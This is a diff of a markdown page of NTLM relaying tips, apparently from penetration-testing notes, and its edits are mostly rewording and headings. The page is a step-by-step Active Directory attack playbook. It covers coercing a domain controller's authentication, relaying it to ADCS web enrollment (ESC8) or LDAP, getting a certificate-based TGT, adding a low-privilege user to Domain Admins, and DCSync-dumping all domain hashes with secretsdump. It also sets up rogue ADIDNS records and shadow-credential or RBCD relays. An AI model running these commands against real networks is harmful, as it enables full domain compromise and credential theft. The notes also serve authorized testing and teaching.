@@ -8,14 +8,15 @@ title: 'NTLM Relaying Tips and Tricks'
 
 # Coerced Authentication via RPC Methods (PetitPotam, ShadowCoerce, DFSCoerce, SpoolSample, etc.)
 
-[Coercer](https://github.com/p0dalirius/Coercer) is your best bet. It covers many of the PoCs discovered into a single well tested tool. It also works well using a SOCKS5 proxy. Remember to use the `--auth-type {smb,http}` flag because in some cases you want HTTP. It can almost always coerce SMB auth, and sometimes HTTP (via WebDAV) if the WebClient service is running.
+[Coercer](https://github.com/p0dalirius/Coercer) A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through 12 methods. It also works well using a SOCKS5 proxy. Remember to use the `--auth-type {smb,http}` flag if HTTP is desired. It can almost always coerce SMB auth, and sometimes HTTP (via WebDAV) if the WebClient service is running.
 
 [NetExec](https://github.com/Pennyw0rth/NetExec) can check for the WebClient service, and also coerce auth with various methods similar to Coercer. Its me 2nd choice.
 
 [ntlmrelayx](https://github.com/fortra/impacket) is the de facto relaying tool. It can capture auth on a wide range of protocols, relay to a wide range of services, and automatically perform many attacks. 
 
 ## SMB -> ADCS HTTP(S) (also known as ESC8)
-1. Checking for ADCS Web Enrollment
+
+### Step 1: Checking for ADCS Web Enrollment
 Certipy will check, but a manual check is sometimes worth it too.
 
 ```bash
@@ -26,17 +27,17 @@ curl -X GET -I https://servername/certsrv/certrqus.asp
 curl -X GET -I https://servername/certsrv/certfnsh.asp
 ```
 
-2. Set up the NTLM Relay to ADCS Web Enrollment 
+### Step 2: Set up the NTLM Relay to ADCS Web Enrollment
 ```bash
 sudo -E env PATH=${PATH} ntlmrelayx.py -smb2support --adcs --template DomainController -t https://ADCS.LAB.LOCAL/certsrv/certfnsh.asp
 ```
 
-3. Coerce SMB authentication from a DC to the NTLM relay server at 192.168.1.100 (which is running the above ntlmrelayx command)
+### Step 3: Coerce SMB authentication from a DC to the NTLM Relay Server
 ```bash
 coercer coerce -u 'lowpriv' -p 'password' -d 'LAB.LOCAL' -l 192.168.1.100 -t DC01.LAB.LOCAL
 ```
 
-4. Get a TGT with the cert
+### Step 4: Get a TGT with the Cert
 ```bash
 certipy auth -pfx DC01.pfx -no-hash -dc-ip DC01.LAB.LOCAL
 ```
@@ -47,7 +48,7 @@ certipy auth -pfx DC01.pfx -domain LAB.LOCAL -dc-ip 10.0.0.1 -ldap-shell
 > add_user_to_group `lowpriv` 'Domain Admins'
 ```
 
-5. Use the TGT to DCSync
+### Step 5: Use the TGT to DCSync
 ```bash
 export KRB5CCNAME=DC01.ccache
 secretsdump.py -k -no-pass -just-dc -outputfile hashes 'LAB.LOCAL/DC01$@DC01.LAB.LOCAL'
@@ -55,7 +56,7 @@ secretsdump.py -k -no-pass -just-dc -outputfile hashes 'LAB.LOCAL/DC01$@DC01.LAB
 
 ## HTTP (WebDAV / WebClient) -> LDAP(S)
 
-1. Check LDAP Signing and Channel Binding
+### Step 1: Check LDAP Signing and Channel Binding
 There are exactly 2 configurations.
 **Secure:** Every DC has "LDAP Signing Enforced" **AND** "Channel Binding Required".
 **Insecure:** At least 1 DC does not enforce LDAP signing **OR** require channeling binding. 
@@ -64,7 +65,7 @@ There are exactly 2 configurations.
 netexec ldap DC01.LAB.LOCAL -u 'lowpriv' -p 'password' -d 'LAB.LOCAL'
 ```
 
-2. Checking for the WebClient (WebDAV) Service
+### Step 2: Checking for the WebClient (WebDAV) Service
 
 The Windows WebClient service can be used to determine if coerced auth via WebDAV (HTTP) will work. Any Domain User can determine if that service is running to find good potential relay victims.
 - Linux: <https://github.com/Hackndo/WebclientServiceScanner>
@@ -83,7 +84,7 @@ dir \\hashleak@SSL\folder
 dir \\hashleak@SSL@8443\folder
 ```
 
-3. ADIDNS (Active Directory Integrated DNS) Record Creation via LDAP(S)
+### Step 3: ADIDNS (Active Directory Integrated DNS) Record Creation via LDAP(S)
 ```bash
 python3 dnstool.py -u 'LAB.LOCAL\lowpriv' -p 'password' -a add -r hashleak -d 192.168.1.100 DC01.LAB.LOCAL
 ```
@@ -93,7 +94,7 @@ If it fails, you sometimes need to use:
 --legacy              Search the System partition (legacy DNS storage)
 ```
 
-4. (Optional) Machine Account Creation (SeMachineAccount and MachineAccountQuota)
+### Step 4: (Optional) Machine Account Creation (SeMachineAccount and MachineAccountQuota)
 Only needed if using Resource-based Constrained Delegation (RBCD) instead of Shadow Credentials.
 Also see (Exploiting RBCD Using a Normal User Account*)[https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html] and <https://github.com/GhostPack/Rubeus/pull/137>
 
@@ -101,7 +102,7 @@ Also see (Exploiting RBCD Using a Normal User Account*)[https://www.tiraniddo.de
 addcomputer.py -dc-host DC01.LAB.LOCAL 'LAB.LOCAL/lowpriv:password'
 ```
 
-5. Setup the HTTP -> LDAP(S) NTLM Relay
+### Step 5: Setup the HTTP -> LDAP(S) NTLM Relay
 Use `ldap://` if LDAP Signing is not enforced. Use `ldaps://` if Channel Binding is not require. Use whatever you want if both options are available.
 
 ```bash
@@ -115,17 +116,18 @@ ntlmrelayx.py -smb2support --delegate-access --no-validate-privs -t ldap://DC01.
 ntlmrelayx.py -smb2support --shadow-credentials -t ldap://DC01.LAB.LOCAL
 ```
 
-6. Coerce Authentication from a WebClient Computer
+### Step 6: Coerce Authentication from a WebClient Computer
 ```bash
 coercer coerce --auth-type http -u 'lowpriv' -p 'password' -d 'LAB.LOCAL' -l hashleak -t TARGET.LAB.LOCAL
 ```
+
 # Coerced Authentication via Spoofing Attacks (LLMNR, NBT-NS, MDNS, DHCPv6 DNS takeover, ARP, etc.)
-A number of Windows and network protocols can be leveraged to misinformation a victim device performing a hostname query, this can leak to the victim device performing NTLM authentication to an attacker controlled hostname or IP address.
+A number of Windows and network protocols can be leveraged to misinform a victim device performing a hostname query, this can lead to the victim device performing NTLM authentication to an attacker controlled machine.
 
 - todo
 
 # Coerced Authentication via Share Poisoning (.lnk, .url, .library-ms, .searchConnector-ms, etc.)
-You can poison writable SMB shares with hash leak files, that when viewed in Windows Explorer (the directory content, not the file itself) the victim account with perform NTLM authentication to an attacker controlled hostname or IP address.
+You can poison writable SMB shares with hash leak files, that when viewed in Windows Explorer (the directory content, not the file itself) the victim account with perform NTLM authentication to an attacker controlled machine.
 
 - todo
 
